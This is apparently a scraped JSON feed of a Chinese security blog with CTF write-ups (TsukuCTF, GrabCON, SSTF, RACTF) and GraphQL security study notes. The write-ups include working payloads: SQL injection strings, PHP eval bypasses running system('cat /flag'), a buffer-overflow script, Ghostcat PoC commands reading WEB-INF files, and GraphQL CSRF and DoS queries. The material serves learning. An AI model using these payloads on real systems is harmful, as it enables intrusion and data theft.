https://tsukuctf.sechack365.com/problems/journey/railway/1\u0026#39; -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal 利用的是http请求中的connect方法，相关内容可参见-\u0026gt;CONNECT(MDN) | HTTP之connect method\nWeb/gyOTAKU 满足17行要求的话会通过chromium browser来返回一个截图\n我们构造一个如下的html页面\n\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt; 返回500错误，再试一下\n\u0026lt;script\u0026gt;location.href=\u0026#34;/etc/passwd\u0026#34;\u0026lt;/script\u0026gt; 成功返回\n用一下我们的老朋友/root/.bash_history\n\u0026lt;script\u0026gt;location.href=\u0026#34;/root/.bash_history\u0026#34;\u0026lt;/script\u0026gt; 可以读一下flag了\n\u0026lt;script\u0026gt;location.href=\u0026#34;/root/flagc464f9eba1.txt\u0026#34;\u0026lt;/script\u0026gt; TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}\n水一篇wp，水水更健康\n","date":"2021-09-13T19:15:21+08:00","permalink":"https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/","section":"posts","tags":["wp"],"title":"TsukuCTF2021 Wp"},{"categories":["CTF"],"contents":"Web/E4sy Pe4sy Hack admin user!\nAuthor: r3curs1v3_pr0xy\n万能密码 username=admin\u0026amp;password=%27%3D%27\nGrabCON{E4sy_pe4sy_SQL_1nj3ct10n}\nWeb/Door Lock The door is open to all! See who is behind the admin door??\nAuthor: r3curs1v3_pr0xy\n和上面那个一样的前端页面，但是很显然万能密码失效，随便登入一个号，有水平越权\n用burp跑一下\nGrabCON{E4sy_1D0R_}\nWeb/Null Food Factory Prove your hacking skill to get admin panel.\nAuthor: r3curs1v3_pr0xy\n还是一模一样的前端，目标还是以admin登入\n用到的是Null byte injection，先以admin%00为用户名注册\n然后用Admin的名字登入\nGrabCON{Null_byt3s_1s_L0v3}\nWeb/Basic Calc Ever used calc based on php?\nAuthor: karma\n\u0026lt;?php if (isset($_POST[\u0026#34;eq\u0026#34;])){ $eq = $_POST[\u0026#34;eq\u0026#34;]; if(preg_match(\u0026#34;/[A-Za-z`]+/\u0026#34;,$eq)){ die(\u0026#34;BAD.\u0026#34;); } echo \u0026#34;Result: \u0026#34;; eval(\u0026#34;echo \u0026#34; . $eq . \u0026#34; ;\u0026#34;); }else{ echo highlight_file(\u0026#39;index.php\u0026#39;,true); } ?\u0026gt; 现在看到php的题感觉那是相当的亲切了……\n虽然是直接有了eval，但是这个正则过滤的有点狠，字母全被ban掉 就只能用xor或八进制的方式来把字母搞出来\n八进制版本：\n\u0026#34;\\163\\171\\163\\164\\145\\155\u0026#34;(\u0026#34;\\154\\163\u0026#34;) // \u0026#34;system\u0026#34;(\u0026#34;ls\u0026#34;) \u0026#34;\\163\\171\\163\\164\\145\\155\u0026#34;(\u0026#34;\\143\\141\\164\\40\\57\\146\\154\\141\\147\\147\\147\\147\\56\\164\\170\\164\u0026#34;) // \u0026#34;system(\u0026#34;cat /flagggg.txt\u0026#34;)\u0026#34; xor\nOuput: (\u0026#34;system\u0026#34;)(\u0026#34;cat /flagggg.txt\u0026#34;) = ((\u0026#39;3\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;9\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;3\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;4\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;2\u0026#39;^\u0026#39;_\u0026#39;))((\u0026#39;8\u0026#39;^\u0026#39;[\u0026#39;).(\u0026#39;!\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;4\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;~\u0026#39;).\u0026#39;/\u0026#39;.(\u0026#39;8\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;1\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;!\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;_\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;_\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;_\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;_\u0026#39;).\u0026#39;.\u0026#39;.(\u0026#39;4\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;8\u0026#39;^\u0026#39;@\u0026#39;).(\u0026#39;4\u0026#39;^\u0026#39;@\u0026#39;)) GrabCON{b4by_php_f0r_y0u}\n参考： https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/ | https://ctf.0xff.re/2021/uiuctf_2021/phpfuck | https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md | https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264\nOSINT/ProtonDate Can you find the date, when was this email created?\nsc4ry_gh0st@protonmail[dot]com\nGrabCON{dd_mm_yyyy}\nAuthor: CETACEAN\n说实话 是纯猜的\nGrabCON{03_09_2021}\n但是看了wp之后发现这确实有正规的做法，一个开源工具叫ProtOSINT，所使用的api如下\nhttps://api.protonmail.ch/pks/lookup?op=index\u0026amp;search=sc4ry_gh0st@protonmail.com 拿到时间戳1630658267，即Fri 3 September 2021 08:37:47 UTC\nOSINT/Victim 1 We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?\nLive Camera\nGrabCON{zipcode}\nAuthor: CETACEAN\n给了一个摄像头的地址，用IP geolocation lookup查一下地点\n画面右上有个在动的缆车\nzipcode: 39031\nGrabCON{39031}\nOSINT/Website My friend is having a website named, \u0026ldquo;Great Animals Here\u0026rdquo;. He have leaked the flag on his website. Can you find the flag?\nHint: He used free website builder tool to create his site. greatanimalshere\nAuthor: CETACEAN\nhttps://greatanimalshere.weebly.com/\nOSINT/The Tour(1) w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?\nAuthor : rey\n空的，试一下wayback machine\nhttps://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/ 也是空的，用sherlock查一下\n后面的内容可以详见wp了，很少做OSINT，但是感觉好有意思，就是找的好麻烦，脑洞好大，不容易啊\nOSINT/The Tour(2) Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}\nAuthor : rey\nwp-\u0026gt;https://kashmir54.github.io/ctfs/GrabCON/#the-tour2\nMisc/Welcome GrabCON{welcome_to_grabcon_2021}\nGrabCON{welcome_to_grabcon_2021}\nMisc/Discord Join our discord server!\n憨批机器人，我没搞明白这个是怎么玩的\ntmd 试了好久 结果竟然在#role\nGrabCON{s@n1ty_fl4g_1s_here}\nfxxxk\nMisc/YouTube Find us on YouTube.\nGrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}\nMisc/Find me Checkout author\u0026rsquo;s social media.\nAuthor: Offen5ive\nGrabCON{n0_fl4g_h3r3}\nCrypto/Warm-up Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.\nAuthor: Offen5ive\nfile:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,false)\u0026amp;input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVVMGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K 全部是b64加密 很简单了\nGrabCON{dayuum_s0n!}\n好菜好菜，开学了 奥里给\n","date":"2021-09-07T11:22:14+08:00","permalink":"https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/","section":"posts","tags":["wp"],"title":"GrabCONCTF2021 Wp"},{"categories":["CTF"],"contents":"https://research.samsung.com/sstf\nhttps://playground.sstf.site/challenges\nTutorial/Practice: Flag Submission SCTF{It_15_tim3_t0_hack!!}\nTutorial/BOF 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261\u0026amp;authkey=%21AO4uYzudT40Rn_Y\u0026amp;em=2\nSCTF{n0w_U_R_B0F_3xpEr7}\nTutorial/BOF 102 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251\u0026amp;authkey=%21AMhDJ94NiXLWqYs\u0026amp;em=2\nfrom telnetlib import Telnet tn = Telnet(\u0026#34;bof102.sstf.site\u0026#34;, 1337) tn.read_until(b\u0026#34;Name \u0026gt; \u0026#34;) tn.write(b\u0026#34;/bin/sh\u0026#34; + b\u0026#34;\\n\u0026#34;) payload = b\u0026#39;A\u0026#39;*20 payload += b\u0026#39;\\xe0\\x83\\x04\\x08\u0026#39; payload += b\u0026#39;C\u0026#39;*4 payload += b\u0026#39;\\x34\\xa0\\x04\\x08\u0026#39; tn.read_until(b\u0026#34; \u0026gt; \u0026#34;) tn.write(payload + b\u0026#39;\\n\u0026#39;) tn.interact() SCTF{B0F_A774ck_w1Th_arg5_1n_x86}\nTutorial/SQLi 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257\u0026amp;authkey=%21ALtIE_cNe-XDn2o\u0026amp;em=2\nSCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}\nTutorial/SQLi102 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260\u0026amp;authkey=%21AGPulJniPCbx8v4\u0026amp;em=2\n\u0026lt;?php include \u0026#34;./config.php\u0026#34;; $succ = -1; if($_GET[\u0026#39;showsrc\u0026#39;]) { show_source(\u0026#34;step1.php\u0026#34;); die; } if($_GET[\u0026#39;searchkey\u0026#39;]) { $succ = 0; $query = \u0026#34;select * from books where title like \u0026#39;%\u0026#34;.$_GET[\u0026#39;searchkey\u0026#39;].\u0026#34;%\u0026#39;\u0026#34;; $db = dbconnect(\u0026#34;sqli102_step3\u0026#34;); $result = mysqli_query($db,$query); mysqli_close($db); if($result) { $rows = mysqli_num_rows($result); } } ?\u0026gt; SCTF{b451c_SQLi_5k1lls}\nTutorial/RC four https://www.geeksforgeeks.org/rc4-encryption-algorithm/\nhttps://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253\u0026amp;authkey=%21AOekQp-wZMxDdfA\u0026amp;em=2\nTutorial/RSA 101 https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256\u0026amp;authkey=%21ANLCkvPBdXSb8Ko\u0026amp;em=2\nWeb/SW Expert Academy Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!\n好家伙，梦回学c语言的时候，看到这个骰子的概率又能梦回高三数学的概率部分\n但是捏，它并不需要你具体写出来code，标答已经给出（虽然我憨憨的一开始没发现自己还写了一份）\nint a[12];for(int i=0;i\u0026lt;12;i++)scanf(\u0026#34;%d\u0026#34;,a+i);int ans=0;int mod=36;for(int i=0;i\u0026lt;6;i++)for(int j=6;j\u0026lt;12;j++)if(a[i]\u0026gt;a[j])ans++;for(int i=2;i\u0026lt;36;i++)while(ans\u0026gt;=i\u0026amp;\u0026amp;ans%i==0\u0026amp;\u0026amp;mod%i==0)ans/=i,mod/=i;printf(\u0026#34;%d/%d\u0026#34;,ans,mod); 当然直接访问/flag.txt又是不可以的\n问题就转化为了如何在输出为符合样例要求的标准输出的情况下还能打印一份地址已知的flag.txt出来\n由于gcc既能编译c也可以编译c++，这里用import来绕过对include的限制；而对于#的绕过可以参见-\u0026gt;Digraphs and trigraphs\n??=import \u0026#34;/flag.txt\u0026#34; %:import \u0026#34;/flag.txt\u0026#34; 相当于#import \u0026ldquo;/flag.txt\u0026rdquo;，从gcc编译时的报错信息可以得到flag\n或者用反斜杠+换行的形式\n??=incl\\ ude \u0026#34;/flag.txt\u0026#34; 也可以绕过对include的过滤\nSCTF{take-care-when-execute-unknown-code}\n————类似的题之前做过一个[FireshellCTF2020]Caas，也是预处理遍历报错出flag\n————在看了别的师傅的wp之后看到了另一种解法，从未设想过的道路\nWeb/Poxe Center how to get legendary poxemon?\n看了wp，直接sqlmap一把梭\n不过官方的预期解wp更复杂一些：\n先爆目录/docs/\n这个版本下有CVE-2020-1938 - Ghostcat，相关文章参考-\u0026gt;不调试源码重现 Ghostcat 漏洞 (CVE-2020-1938)\n使用公开的poc读一下配置文件，之后将class反编译获得java源文件（官方poc精简了一些内容 不过大差不差）\npython poc.py -p 31811 -f \u0026#34;/WEB-INF/web.xml\u0026#34; 127.0.0.1 python poc.py -p 31811 -f \u0026#34;/WEB-INF/classes/com/samsung/sctf/MainController.class\u0026#34; 127.0.0.1 python poc.py -p 31811 -f \u0026#34;/WEB-INF/classes/com/samsung/sctf/gochaMapper.class\u0026#34; 127.0.0.1 python poc.py -p 31811 -f \u0026#34;/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml\u0026#34; 127.0.0.1 /WEB-INF/classes/mapper/gochaMapper.xml是这样的\n这里的sortName和sortFlag直接拼接进sql语句中没有过滤，尝试sqli\nsortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)\u0026amp;sortFlag=desc sortName=(case when (select true) then poke_name else \u0026#39;0\u0026#39; end)\u0026amp;sortFlag=asc sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)\u0026amp;sortFlag=desc sortName=(case when (select false) then poke_name else \u0026#39;0\u0026#39; end)\u0026amp;sortFlag=asc sortName=random())dummy UNION SELECT\u0026#39;A\u0026#39;,\u0026#39;B\u0026#39;,\u0026#39;C\u0026#39;,\u0026#39;D\u0026#39;,\u0026#39;D\u0026#39;,\u0026#39;F\u0026#39;,now(),\u0026#39;G\u0026#39;,\u0026#39;H\u0026#39;,\u0026#39;I\u0026#39; FROM(SELECT 1 sortFlag=NULL sortName=random())dummy UNION SELECT DD.\u0026#34;index\u0026#34;,DD.\u0026#34;name\u0026#34;,DD.first_attribute,DD.second_attribute,\u0026#39;XX\u0026#39;,\u0026#39;XX\u0026#39;,now(),\u0026#39;XX\u0026#39;,\u0026#39;XX\u0026#39;,\u0026#39;XX\u0026#39; FROM( SELECT * from poke_info sortFlag=\u0026#34;\u0026#34; {G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}\nMisc/meLorean There was a crazy Data Scientist who rectilinearly claimed mathematics can make miracles. He left a note and then disappeared. Help to decode it.\n给出了一个这样的文件，充满了二维坐标\n一个线性回归的相关问题，需要用到python中的sklearn.linear_model进行数据处理\nimport ast from sklearn.linear_model import LinearRegression r = LinearRegression() flag = [] with open(\u0026#34;dataset.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: for l in f: l = ast.literal_eval(l) X = [[i[0]] for i in l] y = [i[1] for i in l] r.fit(X, y) flag.append(chr(int(round(r.coef_[0])))) print(\u0026#34;\u0026#34;.join(flag)) SCTF{Pr0gre55_In_R3gr3ss}\nADBaby 是在看wp的时候注意到的题，看了个大概流程（其实只是眼熟adb而已 菜鸡 别骂了），所以下面就是大概翻译一下wp，很水\n先连接上adb connect adbaby.sstf.site:6666，发现这是一个魔改过的adb，屏蔽了shell和主要功能，但是可以使用push/pull，属于文件管理类的命令（全部指令参见-\u0026gt;你确定已经掌握了adb的使用？\nadb pull /proc/self/exe adbaby拿到文件用IDA进行分析，可以看到flag的路径在/data/local/tmp/flag处，但直接用adb pull是不可达的，因为对./, ../, data, local, tmp, flag这些字眼进行了过滤\n有一个自定的service名为adb Flag Service，对输入的密码进行检查，md5后开头是0123456的话就可以拿到flag，用脚本跑一下 415349420009\nfrom adb import adb_commands device = adb_commands.AdbCommands() device.ConnectDevice(serial=\u0026#39;adbaby.sstf.site:6666\u0026#39;) conn = device.protocol_handler.Open(device._handle, b\u0026#39;flag:\u0026#39;) def sendafter(*args): print(device.protocol_handler.InteractiveShellCommand(conn, *args).decode()) sendafter() sendafter(\u0026#39;415349420009\u0026#39;) SCTF{Do_Uth1nk_th1s_1s_adb}\n","date":"2021-09-05T11:09:54+08:00","permalink":"https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/","section":"posts","tags":["wp"],"title":"SSCTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"GraphQL简述 GraphQL是一种针对Graph（图状数据）查询很有优势的Query Language（查询语言），而涉及到存储时可以选择NoSQL, SQL或其它任意存储方式（例如文本文件、存内存里等）；这是一门便于前后端交互的语言，而不是便于后端和数据库交互的语言。\n应用GraphQL的一个很重要的前提是后端数据已经以图的结构进行保存，（并且一定情况下已经设置好基于隐私的访问控制 授权与鉴权，否则会直接被攻击者执行高危操作）。每次查询或更新都有自己的根节点，得到的数据是树状结构；如果希望以图的形式展示则前端不能简单的对其进行缓存，那必须使用相应的存储数据库，通过顶点的ID把不同节点之间的某些边重新连接起来。\n并不是所有场景都需要迁移到GraphQL，如果RESTful API已经能满足需求的话。\nGraphQL is basically just sugar for a simply typed lambda calculus.\n变更 - Mutations three important things:\nmutations are just queries in different namespace, but do NOT mix them;\narguments require Input Objects, not normal Objects;\nuse xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)\n内省 - introspection GraphQL 允许在查询的任何位置请求 __typename，一个元字段(Meta fields)，以获得那个位置的对象类型名称。\n我们也可以通过查询 __schema 字段来向 GraphQL 询问哪些类型是可用的，类型有以下这些：\nQuery, Character, Human, Episode, Droid - 这些是我们在类型系统中定义的类型。 String, Boolean - 这些是内建的标量，由类型系统提供。 __Schema, __Type, __TypeKind, __Field, __InputValue, __EnumValue, __Directive - 这些有着两个下划线的类型是内省系统的一部分。 敏感信息泄露\u0026amp;越权 自动文档生成/解析 - graphdoc | graphql-playground | graphql-voyager \u0026hellip;\u0026hellip;\n由于对对象或属性的权限控制不完善，导致信息泄露，案例：hackerone 一系列信息泄露漏洞\n在objects.types中寻找敏感信息，如email, password, secretkey, token, licensekey, session等，多多关注废弃字段（deprecated fields)。当字段被废弃后直接用__type做内省确实查找不到，但当指定includeDreprecated: true时，__type仍然可以将废弃字段暴露出来。\nGraphQL的认证方式 GraphQL并没有规定任何身份认证和权限控制的相关内容，因此我们可以更灵活的在应用中实现各种粒度的认证和权限；但是也很容易写出一些“裸奔”的接口或无效认证无效的接口。\n独立认证终端 (RESTful) 通用且官方推荐的方式，如果后端本身支持RESTful或有专门的认证服务器，可以修改少量代码实现GraphQL接口的认证。\n举例：添加jwt认证\n在GraphQL内认证 如果GraphQL的后端支持GraphQL不能支持RESTful，或全部请求都需要使用GraphQL，也可以用构造相关的Query Schema接口返回token的形式。\n举例：构造login的Query Schema，在返回值中携带token\ntype Query{ login( username: String! password: String! ): LoginMsg type LoginMsg{ message: String token: String } } 在resolver中提供登录逻辑\nimport bcrypt from \u0026#39;bcrptjs\u0026#39;; import jsonwebtoken from \u0026#39;jsonwebtoken\u0026#39;; export const login = async(_, args, context) =\u0026gt; { const db = await context.getDb(); const{username, password} = args; const user = await db.collection(\u0026#39;User\u0026#39;).findOne({username: username}); if(await bcyrpt.compare(password, user.password)){ return{ message: \u0026#39;Login success\u0026#39;, token: jsonwebtoken.sign({ user: user, exp: Math.floor(Date.now() / 1000) + (60 * 60), }, \u0026#39;your secret\u0026#39;), }; } } 登录成功后 我们把token设置在请求头中，继续请求GraphQL的其他接口，这时需要对ApolloServer进行如下配置\nconst server = new ApolloServer({ typeDefs: schemaText, resolvers: resolverMap, context: ({ ctx }) =\u0026gt; { const token = ctx.req.headers.authorization || \u0026#39;\u0026#39;; const user = getUser(token); return{ ...user, ...ctx, ...app.context }; }, }); 实现getUser函数\nconst getUser = (token) =\u0026gt; { let user = null; const parts = token.split(\u0026#39; \u0026#39;); if(parts.length === 2){ const scheme = parts[0]; const credentials = parts[1]; if(/^Bearer$/i.test(scheme)){ token = credentials; try{ user = jwt.verify(token, JWT_SECRET); console.log(user); }catch(e){ console.log(e); } } } return user } 配置好ApolloServer后，在resolver中校验user\nimport {ApolloError, ForbiddenError, AuthenticationError} from \u0026#39;apollo-server\u0026#39;; export const blogs = async(_, args, context) =\u0026gt; { const db = await context.getDb(); const user = context.user; if(!user){ throw new AuthenticationError(\u0026#39;You must be logged in to see blogs\u0026#39;); } const {blogId} = args; const cursor = {}； if(blogId){ cursor[\u0026#39;_id\u0026#39;] = blogId; } const blogs = await db .collection(\u0026#39;blogs\u0026#39;) .find(cursor) .sort({publishedAt: -1}) .toArray(); return blogs; } 更多安全漏洞 Express-GraphQL：\n框架默认无防护 自带GraphiQL Graphene-Django：\n依赖Django的安全配置（Secure As Default） 自带GraphiQL GraphQL-PHP\n无关框架 Express-GraphQL Endpoint CSRF漏洞 {\u0026#34;query\u0026#34;:\u0026#34;mutation {\\n editProfile(name:\\\u0026#34;hacker\\\u0026#34;, age: 5) {\\n name\\n age\\n }\\n}\u0026#34;,\u0026#34;variables\u0026#34;:null} 将Content-Type修改为application/x-www-form-urlencode，仍可成功执行\nquery=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20 5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D 直接配合burp自带的Generate CSRD POC\nGraphiQL Clickjacking 漏洞 参见：https://github.com/graphql/graphiql/issues/683\n可以配合burp自带的Clickbandit进行攻击\nGraphQL injection 漏洞 这是一个相当全的payloads\u0026amp;exps | 这是一个自省payload\np神ppt里的示意图直接搬过来了\n仍然是拼接了恶意的GraphQL语句导致漏洞的发生，本质还是对用户输入的控制不严格；同类的漏洞还有xss, rce等等\n有语法就有解析，有解析就会有结构和顺序，有结构和顺序就会有注入。\n用“参数化查询”的方式来解决上述问题时，要确保后端的解析引擎没有大病\n通过Custom Scalar的注入 (JSON) NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of \u0026lsquo;custom scalar types\u0026rsquo;\n————更多的GraphQLi相关问题可参见这个git仓库，一本满足（\n拒绝服务 GraphQL中的query和mutation的返回结果都是可以有嵌套的对象的，如果不对嵌套深度进行限制，有可能被利用从而进行拒绝服务攻击。\n一个举例：\n定义了Blog和Author:\ntype Blog{ _id: String! type: BlogType avatar: String title: String content: [String] author: Author .... } type Author{ _id: String! name: String blog: [Blog] } 都有各自的Query:\nextend type Query{ blogs( blogId: ID systemType: String! ): [Blog] } extend type Query{ author( _id: String ): Author } 我们可以构造这样的查询，无限套娃导致dos\nquery GetBlogs($blogId: ID, $systemType: String!) { blogs(blogId: $blogId, systemType: $systemType) { _id title type content author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name # and so on... } } } } } } } } } } } } } title createdAt publishedAt } } publishedAt } } 解决这个问题我们需要在GraphQL服务器上限制查询深度，同时设计GraphQL接口时尽量避免出现此类问题，以Node.js为例，graphql-depth-limit就可以解决这样的问题\n// ... import depthLimit from \u0026#39;graphql-depth-limit\u0026#39;; // ... const server = new ApolloServer({ typeDefs: schemaText, resolvers: resolverMap, context: ({ ctx }) =\u0026gt; { const token = ctx.req.headers.authorization || \u0026#39;\u0026#39;; const user = getUser(token); console.log(\u0026#39;user\u0026#39;, user) return{ ...user, ...ctx, ...app.context }; }, validationRules: [ depthLimit(10) ] }); // ... Graphene-Django DEBUG模式下的安全问题 在CTF中的表现 [HITB CTF Singapore 2017]Blog\n[SECT 2017]Dark Market | wp2\n[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3 | wp2\n[VolgaCTF 2020]Library\n[corCTF 2021]devme\n结尾 Damn Vulnerable GraphQL Application-\u0026gt; 一个漏洞复现的靶场，包含了上面提到和没提到的GraphQL存在的洞\ndocker pull dolevf/dvga docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga 已经有写好的wp了 不向互联网产出湿垃圾 从我做起\n以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（ 中文官网\n在线GraphiQL\nlearn-graphql\n什么是 GraphQL？\n玩转graphQL\nGraphQL 从入门到实践\n【CuteJavaScript】GraphQL真香入门教程\n攻击GraphQL\nGraphQL安全指北\nUWP GraphQL数据查询的实现\nGraphQL Mutations\nGraphQL NoSQL Injection Through JSON Types\nGraphQL Injection\n【安全记录】玩转GraphQL - DVGA靶场（上）\n【安全记录】玩转GraphQL - DVGA靶场（下）\n[HITB CTF Singapore 2017]Blog\n[SECT 2017]Dark Market | wp2\n[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3 | wp2\n[VolgaCTF 2020]Library\n开学了，不摆烂从我做起\n","date":"2021-09-03T20:56:54+08:00","permalink":"https://amiaaaz.github.io/2021/09/03/graphql-study-notes/","section":"posts","tags":["GraphQL"],"title":"GraphQL学习笔记"},{"categories":[],"contents":"你好呀ﾟ∀ﾟ)ノ\n这里是葵子，一个信安专业的普通大二学生，V\u0026amp;N划水摸鱼\n超高校级网上冲浪爱好者，喜欢看书，听歌和思考人生，喜欢打音游和一些单机游戏，运动细胞为0\nctf web方向的看题选手（别问为什么只是看题 问就是签到题都不会），不过人菜瘾大，日常瞎琢磨，瞎研究；兴趣驱动型，有一颗想成为全栈的心（梦想还是要有的，日拱一卒，说不定就实现了x\n在努力让自己看起来不那么菜，进度0/n（已经脱离负数了！好消息）\n致力于点出一棵茂盛、浓密的技能树。既然“以有涯随无涯”会die();，那就设好断点，在调试的过程中慢慢debug，说不定就Bypass了呢？\n这个小小的博客会包含一些粗糙但质朴的笔记和精致且同样用心的wp，还会有一些信手写就的文字，于21年7月底开张。\n虽然现在只有一些含水量很高、技术力很低的互联网湿垃圾，但未来这里一定会有自己的原创产出；虽然现在小站门可罗雀，但希望有一天可以为更多的人带来帮助；希望在学安全的道路上一直走下去\nstay hungry, stay foolish.\nI wanna be defined by the things that I love\nNot the things I hate\nNot the things I\u0026rsquo;m afraid of, I\u0026rsquo;m afraid of\nOr the things that haunt me in the middle of the night\nI, I just think that\nYou are what you love\n","date":"2021-08-25T01:39:57+08:00","permalink":"https://amiaaaz.github.io/about/","section":"","tags":[],"title":"About"},{"categories":["CTF"],"contents":"https://2021.ractf.co.uk/\nhttps://github.com/ractf/challenges/tree/master/2021\nhttps://github.com/404dcd/RACTF-challenges\nhttps://blog.ractf.co.uk/tag/ractf-2021/\nWeb/Really Awesome Monitoring Dashboard 🌟 Perfect infrastructure 🌟\n是grafana\n但是版本也太新了吧8.1.1，弱口令也没有，抓包可以看到它在不停的请求各种api，其中有个/api/ds/query，以明文方式请求数据库内容\n那这就好说了，直接明牌了都\nSELECT name FROM sqlite_master WHERE type =\u0026#39;table\u0026#39; AND name NOT LIKE \u0026#39;sqlite_%\u0026#39;; SELECT * FROM flags; ————这个故事告诉我们对于权限的设置是很重要的，不要随便把api接口暴露出来，也不要明文传递信息\nWeb/Really Awesome Hidden Service Ahoy, matey! 